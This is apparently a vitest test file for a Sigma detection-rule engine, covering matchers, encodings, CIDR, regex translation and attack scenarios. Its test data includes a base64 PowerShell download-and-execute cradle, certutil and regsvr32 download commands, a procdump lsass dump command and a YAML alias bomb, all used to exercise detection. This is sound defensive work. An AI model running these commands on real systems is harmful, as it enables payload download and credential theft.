import { existsSync } from "node:fs";
import { describe, expect, it } from "vitest";
import { checkGate, filterByLevel, runCoverage } from "../src/coverage.js";
import { loadRuleSet } from "../src/io.js";
import { parseScenarios } from "../src/scenarios.js";
import { evaluateRule } from "../src/sigma/evaluate.js";
import { cidrContains, compileFieldMatcher, encodeText, translatePcre, windashVariants } from "../src/sigma/matchers.js";
import { parseRuleFile, parseRules } from "../src/sigma/parse.js";
import { SigmaError, UnsupportedError } from "../src/sigma/types.js";

const m = (key: string, raw: unknown, event: Record<string, unknown>) => compileFieldMatcher(key, raw).test(event);
const PROC = { category: "process_creation", product: "windows" };
const head = `logsource: { category: process_creation, product: windows }\n`;

describe("field lookup safety", () => {
  it("does not resolve inherited object properties", () => {
    expect(m("constructor|exists", true, {})).toBe(false);
    expect(m("toString", "*", {})).toBe(false);
    expect(m("__proto__|exists", true, {})).toBe(false);
  });
});

describe("cased and fieldref", () => {
  it("cased makes matching case-sensitive", () => {
    expect(m("A|cased", "Mimikatz", { A: "mimikatz" })).toBe(false);
    expect(m("A|cased", "Mimikatz", { A: "Mimikatz" })).toBe(true);
    expect(m("A|contains|cased", "Katz", { A: "MimiKatz" })).toBe(true);
  });
  it("fieldref compares one field with another", () => {
    expect(m("User|fieldref", "TargetUser", { User: "bob", TargetUser: "BOB" })).toBe(true);
    expect(m("User|fieldref", "TargetUser", { User: "bob", TargetUser: "eve" })).toBe(false);
    expect(m("User|fieldref", "TargetUser", { User: "bob" })).toBe(false);
    expect(m("Cmd|fieldref|contains", "Img", { Cmd: "run C:\\a.exe now", Img: "c:\\A.exe" })).toBe(true);
    // The referenced value is literal text, never a wildcard pattern.
    expect(m("A|fieldref", "B", { A: "abc", B: "a*" })).toBe(false);
  });
});

describe("encodings", () => {
  it("encodes UTF-16 like Node does", () => {
    expect(Buffer.from(encodeText("Hé", "utf16le")).equals(Buffer.from("Hé", "utf16le"))).toBe(true);
    expect([...encodeText("A", "utf16be")]).toEqual([0, 65]);
    expect([...encodeText("A", "utf16")]).toEqual([0xff, 0xfe, 65, 0]);
  });
  it("finds a phrase inside a real PowerShell -EncodedCommand payload", () => {
    const payload = Buffer.from("$c = New-Object Net.WebClient; IEX $c.DownloadString('http://x')", "utf16le").toString("base64");
    const event = { CommandLine: `powershell.exe -enc ${payload}` };
    expect(m("CommandLine|wide|base64offset|contains", "DownloadString", event)).toBe(true);
    expect(m("CommandLine|base64offset|contains", "DownloadString", event)).toBe(false);
    expect(m("CommandLine|wide|base64offset|contains", "Invoke-Mimikatz", event)).toBe(false);
  });
  it("requires base64 after an encoding", () => {
    expect(() => compileFieldMatcher("A|wide|contains", "x")).toThrow(/must be used together with base64/);
  });
});

describe("windash", () => {
  it("matches mixed dash styles in one command line", () => {
    expect(m("C|contains|windash", "-ma -accepteula", { C: "procdump /ma \u2013accepteula lsass" })).toBe(true);
    expect(m("C|contains|windash", "/s /i:", { C: "regsvr32 -s -i:http://x" })).toBe(true);
    expect(m("C|contains|windash", "-ma", { C: "procdump xma" })).toBe(false);
  });
  it("does not treat mid-word dashes as switches", () => {
    expect(m("C|contains|windash", "Set-Item", { C: "Set/Item" })).toBe(false);
  });
  it("expands combinations explicitly when base64-encoding", () => {
    expect(windashVariants("-a -b")).toHaveLength(25);
    expect(() => windashVariants("-a -b -c -d -e")).toThrow(UnsupportedError);
  });
});

describe("cidr", () => {
  it("handles IPv6, compressed forms and embedded IPv4", () => {
    expect(cidrContains("2001:db8::/32", "2001:0db8:1::5")).toBe(true);
    expect(cidrContains("2001:db8::/32", "2001:db9::1")).toBe(false);
    expect(cidrContains("::1/128", "::1")).toBe(true);
    expect(cidrContains("fe80::/10", "fe80::1%eth0")).toBe(true);
    expect(cidrContains("::ffff:0:0/96", "::ffff:10.0.0.1")).toBe(true);
    expect(cidrContains("10.0.0.0/8", "::1")).toBe(false);
    expect(cidrContains("0.0.0.0/0", "8.8.8.8")).toBe(true);
  });
  it("rejects malformed ranges at load time", () => {
    expect(() => compileFieldMatcher("Ip|cidr", "10.0.0.0/33")).toThrow(/invalid CIDR/);
    expect(() => compileFieldMatcher("Ip|cidr", "nope")).toThrow(/invalid CIDR/);
  });
});

describe("PCRE translation", () => {
  it("turns leading inline flags into JS flags", () => {
    expect(translatePcre("(?i)abc", "f")).toEqual({ source: "abc", flags: ["i"] });
    expect(translatePcre("(?is)a.b", "f").flags).toEqual(["i", "s"]);
    expect(m("A|re", "(?i)^MIMI", { A: "mimikatz" })).toBe(true);
  });
  it("refuses syntax JavaScript would silently misread", () => {
    expect(() => translatePcre("\\Aabc\\Z", "f")).toThrow(UnsupportedError);
    expect(() => translatePcre("a(?i)b", "f")).toThrow(/mid-pattern/);
    expect(() => translatePcre("(?>ab)", "f")).toThrow(/atomic/);
    expect(() => translatePcre("a++", "f")).toThrow(/possessive/);
    expect(() => translatePcre("(?x)a b", "f")).toThrow(/inline flag/);
  });
  it("does not misfire on escapes or character classes", () => {
    expect(translatePcre("a\\++", "f").source).toBe("a\\++");
    expect(translatePcre("[*+]+x", "f").source).toBe("[*+]+x");
    expect(translatePcre("\\\\Users", "f").source).toBe("\\\\Users");
  });
  it("marks rules with untranslatable regexes unsupported, not invalid", () => {
    const [r] = parseRules(`title: t\n${head}detection:\n  s: { A|re: '\\Afoo' }\n  condition: s`);
    expect(r!.unsupported).toMatch(/PCRE-only/);
  });
});

describe("modifier validation", () => {
  it("rejects contradictory combinations", () => {
    expect(() => compileFieldMatcher("A|contains|startswith", "x")).toThrow(SigmaError);
    expect(() => compileFieldMatcher("A|re|contains", "x")).toThrow(SigmaError);
    expect(() => compileFieldMatcher("A|cidr|lt", "1")).toThrow(SigmaError);
    expect(() => compileFieldMatcher("A|i", "x")).toThrow(/requires the re modifier/);
    expect(() => compileFieldMatcher("A|exists", "yes")).toThrow(/true or false/);
    expect(() => compileFieldMatcher("A|lt", "abc")).toThrow(/numeric/);
  });
  it("treats expand as unsupported, not invalid", () => {
    expect(() => compileFieldMatcher("A|expand", "%x%")).toThrow(UnsupportedError);
  });
  it("supports keyword searches with modifiers", () => {
    expect(m("|all", ["mimi", "katz"], { X: "MIMIkatz", Y: 1 })).toBe(true);
    expect(m("|all", ["mimi", "nope"], { X: "mimikatz" })).toBe(false);
  });
});

describe("rule documents", () => {
  it("isolates a bad document so the others still load", () => {
    const text = `title: good\n${head}detection:\n  s: { A: 1 }\n  condition: s\n---\ntitle: bad\n${head}detection:\n  s: { A|bogus: 1 }\n  condition: s\n---\n: : [\n---\ntitle: also good\n${head}detection:\n  s: { B: 1 }\n  condition: s\n`;
    const { rules, issues } = parseRuleFile(text, "f.yml");
    expect(rules.map((r) => r.title)).toEqual(["good", "also good"]);
    expect(issues).toHaveLength(2);
    expect(issues[0]!.message).toMatch(/Unknown modifier "bogus"/);
    expect(issues[0]!.source).toBe("f.yml (document 2)");
    expect(issues[1]!.message).toMatch(/YAML error/);
  });
  it("merges action: global into each following rule and honours reset and repeat", () => {
    const text = `action: global\ntitle: base\n${head}detection:\n  condition: s\n---\ndetection:\n  s: { A: 1 }\n---\ntitle: second\ndetection:\n  s: { A: 2 }\n---\naction: repeat\ndetection:\n  s: { A: 3 }\n---\naction: reset\n---\ntitle: alone\nlogsource: { product: linux }\ndetection:\n  s: { A: 4 }\n  condition: s\n`;
    const { rules, issues } = parseRuleFile(text);
    expect(issues).toEqual([]);
    expect(rules.map((r) => r.title)).toEqual(["base", "second", "second", "alone"]);
    expect(rules.map((r) => r.logsource.product)).toEqual(["windows", "windows", "windows", "linux"]);
    expect(evaluateRule(rules[2]!, { A: 3 }, PROC)).not.toBeNull();
    expect(evaluateRule(rules[2]!, { A: 2 }, PROC)).toBeNull();
  });
  it("rejects alias bombs instead of hanging", () => {
    const bomb = `a: &a [x,x,x,x,x,x,x,x,x]\nb: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]\nc: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]\nd: [*c,*c,*c,*c,*c,*c,*c,*c,*c]\n`;
    const { issues } = parseRuleFile(bomb);
    expect(issues[0]?.message).toMatch(/YAML error/);
  });
  it("flags meta filter rules as unsupported", () => {
    const [r] = parseRules(`title: f\nfilter:\n  rules: [x]\n  selection: { A: 1 }\n  condition: not selection\n`);
    expect(r!.unsupported).toMatch(/filter/);
  });
  it("deduplicates repeated ATT&CK tags", () => {
    const [r] = parseRules(`title: t\ntags: [attack.t1003.001, attack.T1003.001]\n${head}detection:\n  s: { A: 1 }\n  condition: s`);
    expect(r!.techniques).toEqual(["T1003.001"]);
  });
});

describe("multi-stage scenarios", () => {
  const scenarios = parseScenarios(`id: chain
technique: T1105
logsource: { category: process_creation, product: windows }
events:
  - { Image: 'C:\\x\\certutil.exe', CommandLine: 'certutil -urlcache -f http://a/b' }
  - _logsource: { category: network_connection }
    DestinationIp: 203.0.113.9
`);
  it("gives each event its own logsource", () => {
    expect(scenarios[0]!.events[1]!.logsource).toEqual({ category: "network_connection", product: "windows" });
    expect(scenarios[0]!.events[1]!.fields).toEqual({ DestinationIp: "203.0.113.9" });
  });
  it("evaluates rules only against matching-logsource events", () => {
    const rules = parseRules(`title: net
id: n1
logsource: { category: network_connection, product: windows }
detection:
  s: { DestinationIp|cidr: 203.0.113.0/24 }
  condition: s
`);
    const report = runCoverage(rules, scenarios);
    expect(report.scenarios[0]!.firings).toEqual([{ ruleId: "n1", ruleTitle: "net", selections: ["s"], eventIndex: 1 }]);
  });
  it("rejects bad event logsources", () => {
    expect(() => parseScenarios(`id: x\ntechnique: T1105\nevents: [ { _logsource: 5, A: 1 } ]\n`)).toThrow(/logsource/);
    expect(() => parseScenarios(`id: x\ntechnique: T1105\nevents: [ { _logsource: { product: x } } ]\n`)).toThrow(/no fields/);
    expect(() => parseScenarios(`id: x\nmalicious: "no"\nevents: [ { A: 1 } ]\n`)).toThrow(/true or false/);
  });
});

describe("report bookkeeping", () => {
  const rules = parseRules(
    `title: a\nid: dup\nlevel: low\n${head}detection:\n  s: { A: 1 }\n  condition: s\n---\ntitle: b\nid: dup\nlevel: high\n${head}detection:\n  s: { A: 2 }\n  condition: s\n`,
  );
  const scenarios = parseScenarios(`id: s\ntechnique: T1000\nlogsource: { category: process_creation, product: windows }\nevents: [ { A: 1 } ]\n`);
  it("reports duplicate ids and invalid documents, and strict mode fails on them", () => {
    const report = runCoverage(rules, scenarios, [{ source: "x.yml", message: "boom" }]);
    expect(report.duplicateRuleIds).toEqual(["dup"]);
    expect(report.summary.invalidRules).toBe(1);
    expect(checkGate(report, { strict: true }).passed).toBe(false);
    expect(checkGate(report, {}).passed).toBe(true);
  });
  it("filters by level", () => {
    expect(filterByLevel(rules, "medium").map((r) => r.title)).toEqual(["b"]);
    expect(filterByLevel(rules, "informational")).toHaveLength(2);
  });
});

// Optional: point ASSAY_CORPUS at a SigmaHQ checkout to check the whole public rule set loads.
const corpus = process.env.ASSAY_CORPUS;
describe.skipIf(!corpus || !existsSync(corpus))("public Sigma corpus", () => {
  it("loads every rule without an invalid document", () => {
    const { rules, issues } = loadRuleSet(corpus as string);
    expect(rules.length).toBeGreaterThan(3000);
    expect(issues).toEqual([]);
    expect(rules.filter((r) => r.unsupported).length / rules.length).toBeLessThan(0.01);
  }, 60_000);
});
